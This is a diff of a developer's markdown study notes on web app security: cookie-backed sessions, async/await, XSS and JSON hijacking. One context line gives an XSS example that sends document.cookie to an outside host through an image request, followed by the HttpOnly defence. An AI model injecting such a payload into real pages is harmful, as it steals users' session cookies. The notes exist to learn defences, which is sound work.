@@ -128,6 +128,10 @@ console.log(hash);
 #### TODOs:
 * Once user is created, identify request are coming from same user for authorization etc.
 * Solution: Use cookie backed session implementation to track logged in user. Cookie is speaial header which browser send with every request to server.
+    * Create Session(sessionid, user, expriesAt/validUntil)
+    * Create SessionStore - SessionID - Session
+    * Response: set session cookie (secure, http only)
+    * Request: read session cooki and set User details accordingly
     * Use crypto.randomBytes for generating session id that is hard to guess 
         * **Refactoring**: Node callback based API calls will lead to nesting of callbacks.
         * Use async / await feature of typescript ... async calls will be executed asynchronously but code will not have nesting. With asyc / await code reads like synchronous style code - easy read ... less boiler plate.
@@ -144,12 +148,13 @@ console.log(hash);
             * Comments ... which are not sanitized of HTML tags
             new Image().src="http://host.com/somepath=" + document.cookie; 
             * Solution - Mark cookies HttpOnly. - Will not be accesible to javascript ... Browser anyway is handling it automatically
+    * **JSON hijacking** - Securing REST endpoints
+        * **SOLUTION**: Return an object instead of an array from REST endpoint
+        * What is it? - why ???
+            * Seems array is valid javascript file ... can be loaded by script tag.
+            * Array constructor can be changed at runtime and attacker can do what? Not sure ...
+        * This is fixed in mdern browsers.
 
-
-    * Create Session(sessionid, user, expriesAt/validUntil)
-    * Create SessionStore - SessionID - Session
-    * Response: set session cookie (secure, http only)
-    * Request: read session cooki and set User details accordingly
 
 
 #### Expected Key characteristics
